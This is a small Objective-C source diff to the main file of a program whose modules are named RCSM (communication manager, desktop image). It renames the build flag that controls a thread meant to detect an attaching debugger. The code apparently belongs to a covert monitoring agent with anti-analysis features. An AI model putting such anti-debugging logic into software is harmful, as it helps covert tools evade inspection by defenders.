@@ -16,8 +16,10 @@
 #import "RCSMCommunicationManager.h"
 
 #import "RCSMDesktopImage.h"
+#import "RCSMDebug.h"
 
 //#define TEST_MODE
+
 
 int main (int argc, const char *argv[])
 {
@@ -99,7 +101,7 @@ int main (int argc, const char *argv[])
   //
   // Spawn a thread who checks whenever a debugger is attaching our app
   //
-#ifndef TEST_MODE
+#ifndef NO_ANTIDEBUGGING
   [NSThread detachNewThreadSelector: @selector(xfrth)
                            toTarget: core
                          withObject: nil];
